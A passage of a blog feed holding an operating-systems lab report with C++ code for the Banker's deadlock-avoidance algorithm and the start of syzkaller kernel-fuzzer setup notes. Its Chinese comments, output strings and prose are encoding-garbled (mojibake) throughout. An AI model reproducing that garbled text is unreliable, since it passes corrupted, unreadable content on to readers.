class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> M 100</span><br><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//æ¯ç§èµ„æºç°æœ‰çš„å®ä¾‹æ•°é‡</span><br>    Max[N][M],        <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹içš„å¯¹èµ„æºjæœ€å¤§éœ€æ±‚</span><br>    Allocation[N][M], <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹ç°åœ¨æ‰€åˆ†é…çš„æ¯ä¸ªèµ„æºçš„å®ä¾‹æ•°é‡</span><br>    Need[N][M],       <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹è¿˜éœ€è¦çš„å‰©ä½™çš„èµ„æº</span><br>    Request[N][M],    <span class="hljs-comment">//è¿›ç¨‹èµ„æºè¯·æ±‚</span><br>    sign[N],          <span class="hljs-comment">//è®°å½•å®‰å…¨åºåˆ—</span><br>    process_num,      <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br>    recourse_num;     <span class="hljs-comment">//èµ„æºæ•°é‡</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//åˆå§‹åŒ–è¿›ç¨‹èµ„æºçŠ¶å†µ</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; process_num &gt;&gt; recourse_num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Max[i][j];<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        cin &gt;&gt; Available[j];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//æ‰“å°è¿›ç¨‹èµ„æºè¡¨</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-----------------------------------è¿›ç¨‹èµ„æºè¡¨------------------------------------&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|    è¿›ç¨‹åç§°   |   å·²å ç”¨èµ„æº  |    å°šéœ€èµ„æº   |  æœ€å¤§æ‰€éœ€èµ„æº |  èµ„æºå‰©ä½™å®ä¾‹ |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> * recourse_num; j++)<br>    &#123;<br><br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">char</span></span>(j % recourse_num + <span class="hljs-string">&#x27;A&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ((j + <span class="hljs-number">1</span>) % recourse_num == <span class="hljs-number">0</span>)<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>; <span class="hljs-comment">//è¿›ç¨‹åç§°</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Allocation[i][j]; <span class="hljs-comment">//å·²å ç”¨èµ„æº</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Need[i][j]; <span class="hljs-comment">//å°šéœ€èµ„æº</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Max[i][j]; <span class="hljs-comment">//æœ€å¤§æ‰€éœ€èµ„æº</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            &#123;<br>                cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Available[j]; <span class="hljs-comment">//èµ„æºå‰©ä½™å®ä¾‹</span><br>            &#125;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; endl;<br>            k = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------------------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//å®‰å…¨æ€§æ£€æŸ¥</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//åˆå§‹åŒ–work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//è®¾ç½®false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////æ»¡è¶³æ¡ä»¶é‡Šæ”¾èµ„æºï¼Œå¹¶ä»å¤´å¼€å§‹æ‰«æè¿›ç¨‹é›†åˆ</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//å½“è¿›ç¨‹å„ç±»èµ„æºéƒ½æ»¡è¶³NEED&lt;=WORKæ—¶</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//é‡Šæ”¾è¿›ç¨‹</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//è®°å½•ä¸‹æ»¡è¶³æ¡ä»¶çš„è¿›ç¨‹</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//ä»å¤´å¼€å§‹æ‰«æ</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;æ‰€éœ€èµ„æºæ•°è¶…å‡ºå…¶å®£å¸ƒçš„æœ€å¤§å€¼!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;æ— è¶³å¤Ÿèµ„æºï¼Œp[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]éœ€ç­‰å¾…!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å°è¯•ä¸ºè¿›ç¨‹åˆ†é…èµ„æº</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å°è¯•è¿›è¡Œèµ„æºåˆ†é…åçš„è¿›ç¨‹èµ„æºè¡¨: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//æ‰§è¡Œå®‰å…¨æ€§ç®—æ³•</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ç»å®‰å…¨æ€§æ£€æŸ¥ï¼Œç³»ç»Ÿå®‰å…¨ï¼Œæœ¬æ¬¡åˆ†é…æˆåŠŸ&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å®‰å…¨è¿›ç¨‹åºåˆ—ä¸ºï¼š&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[i] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>;<span class="hljs-comment">//è¾“å‡ºå®‰å…¨çš„è¿›ç¨‹åºåˆ—</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å®‰å…¨æ€§æ£€æµ‹å¤±è´¥!ç³»ç»Ÿä¸å®‰å…¨!!!æ­£åœ¨æ¢å¤èµ„æºåˆ†é…------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<span class="hljs-comment">//æ¢å¤è¿›ç¨‹èµ„æºåˆ†é…</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;åˆå§‹åŒ–è¿›ç¨‹ä¿¡æ¯ä¸ºï¼š&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-keyword">int</span> i, tt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (tt != <span class="hljs-number">999</span>)<br>    &#123;<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¯·æ±‚èµ„æºRequest[è¿›ç¨‹æ ‡å·i][èµ„æºç±»å‹j]:&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹i=ï¼š&quot;</span>;<br>        cin &gt;&gt; i;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å„ç±»èµ„æºæ•°é‡(A B C)=:  &quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>            cin &gt;&gt; Request[i][m];<br>        cout &lt;&lt; endl;<br>        <span class="hljs-comment">//æ‰§è¡Œæ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•</span><br>        <span class="hljs-built_in">Banker_Algorithm</span>(i);<br>        <span class="hljs-comment">//è¾“å‡ºæ¯æ¬¡åˆ¤æ–­äº§ç”Ÿçš„æ‰§è¡Œåºåˆ—</span><br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;å½“å‰èµ„æºåˆ†é…è¡¨ï¼š&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">print_information</span>();<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥N(å½“N=999é€€å‡º)ï¼š&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; tt;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>åˆå€¼</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><br><span class="hljs-symbol">7 </span><span class="hljs-number">5</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">9 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><br><span class="hljs-symbol">3 </span><span class="hljs-number">3</span> <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>é¦–å…ˆæ‰“å°è¿›ç¨‹åˆå§‹åŒ–ä¿¡æ¯ï¼š</p><p><img src="/posts/ab6ecd69/image-20211128171249029.png" alt="image-20211128171249029"></p><p>ä¸ºè¿›ç¨‹1åˆ†é…èµ„æºï¼ˆ1 0 1ï¼‰</p><p><img src="/posts/ab6ecd69/image-20211128171330517.png" alt="image-20211128171330517"></p><p>å› ä¸ºä¸å®‰å…¨æ— æ³•åˆ†é…çš„æƒ…å†µï¼š</p><p><img src="/posts/ab6ecd69/image-20211128173225317.png" alt="image-20211128173225317"></p><p>æ— è¶³å¤Ÿèµ„æºéœ€è¦ç­‰å¾…çš„æƒ…å†µï¼š</p><p><img src="/posts/ab6ecd69/image-20211128171404061.png" alt="image-20211128171404061"></p><p>ç”³è¯·èµ„æºè¶…è¿‡å…¶æœ€å¤§è¯·æ±‚ï¼š</p><p><img src="/posts/ab6ecd69/image-20211128171419204.png" alt="image-20211128171419204"></p><h3 id="äº”-å®éªŒæ€»ç»“"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“"></a> äº”ã€å®éªŒæ€»ç»“</h3><p>è¿™æ¬¡å®éªŒæ¨¡æ‹Ÿäº†æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•ï¼Œè®©æˆ‘æ›´åŠ æ·±åˆ»çš„ç†è§£äº†è¿›ç¨‹æ­»é”è¿™ä¸€æ¦‚å¿µï¼Œä¹Ÿå­¦ä¹ äº†å¦‚ä½•è¿›è¡Œæ­»é”é¢„é˜²å’Œæ­»é”é¿å…ï¼Œè€Œæ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•æ­£æ˜¯é€šè¿‡æ­»é”é¿å…æ¥å®ç°çš„ï¼Œé€šè¿‡è‡ªå·±ç¼–å†™ä»£ç ï¼Œå¤§å¤§åŠ æ·±äº†å¯¹äºæ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•ç»†èŠ‚çš„ç†è§£ï¼Œç†è§£äº†å¦‚ä½•é€šè¿‡å®‰å…¨æ€§ç®—æ³•æ¥æ£€æŸ¥ç³»ç»ŸçŠ¶æ€æ˜¯å¦å®‰å…¨ï¼Œä¹Ÿæ›´åŠ ç†è§£äº†å¦‚ä½•é€šè¿‡èµ„æºè¯·æ±‚ç®—æ³•æ¥è¯·æ±‚èµ„æºåˆ†é…å’Œé‡Šæ”¾æœªæˆåŠŸåˆ†é…çš„èµ„æºã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>syzkalleré…ç½®å°ç»“</title>
    <link href="/posts/60fc7e01/"/>
    <url>/posts/60fc7e01/</url>
    
    <content type="html"><![CDATA[<p>è¿™éƒ¨åˆ†é…ç½®åŸºæœ¬å‚ç…§<a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md">syzkallerå®˜æ–¹æ–‡æ¡£</a></p><h3 id="å®‰è£…å‰å‡†å¤‡"><a class="markdownIt-Anchor" href="#å®‰è£…å‰å‡†å¤‡"></a> å®‰è£…å‰å‡†å¤‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo apt update<br>sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>å®‰è£…libncurses-devç­‰æ—¶é‡åˆ°å¦‚ä¸‹é—®é¢˜:</strong></p><p>libncurses5-dev : ä¾èµ–: libtinfo5 (= 5.9+20140118-1ubuntu1) ä½†æ˜¯ 6.1-1ubuntuâ€¦</p><p>è§£å†³ï¼š</p><p>é€ä¸ªå®‰è£…ç›¸åº”ç‰ˆæœ¬çš„ä¾èµ–ï¼Œç¼ºä»€ä¹ˆè£…ä»€ä¹ˆ</p><p><img src="/posts/60fc7e01/image-20211125211645437.png" alt="image-20211125211645437"></p><p><img src="/posts/60fc7e01/image-20211125211316133.png" alt="image-20211125211316133"></p></blockquote><p>æœ€åæˆåŠŸå…¨éƒ¨è£…å®Œ</p><h3 id="ä¸‹è½½å†…æ ¸"><a class="markdownIt-Anchor" href="#ä¸‹è½½å†…æ ¸"></a> ä¸‹è½½å†…æ ¸</h3><ul><li><p>cloneå†…æ ¸æºç </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">git clone --branch v5<span class="hljs-number">.14</span> git:<span class="hljs-comment">//git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git $KERNEL</span><br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯å› ä¸ºè¿™æ ·å¤ªæ…¢äº†ï¼Œæ‰€ä»¥æˆ‘æœ€åé‡‡å–äº†åœ¨ç½‘ç«™ä¸Šç›´æ¥ä¸‹è½½linuxå†…æ ¸5.14ç‰ˆæœ¬çš„å‹ç¼©åŒ…ï¼Œç„¶åè§£å‹è‡³ç›®æ ‡è·¯å¾„</p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-5.14.tar.gz">v5.14å‹ç¼©åŒ…</a></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">tar -zxvf linux-5.14.tar.gz -C ~/syz <br></code></pre></div></td></tr></table></figure></li><li><p>ç”Ÿæˆé»˜è®¤é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">cd $KERNEL<br>make defconfig<br>make kvm_guest.config<br></code></pre></div></td></tr></table></figure></li><li><p>å¯åŠ¨æ‰€éœ€çš„é…ç½®é€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo vim .config<br></code></pre></div></td></tr></table></figure><p>æ‰‹åŠ¨ç¼–è¾‘.configæ–‡ä»¶ï¼ŒåŠ å…¥ä¸‹é¢çš„å˜é‡</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-comment"># Coverage collection.</span><br><span 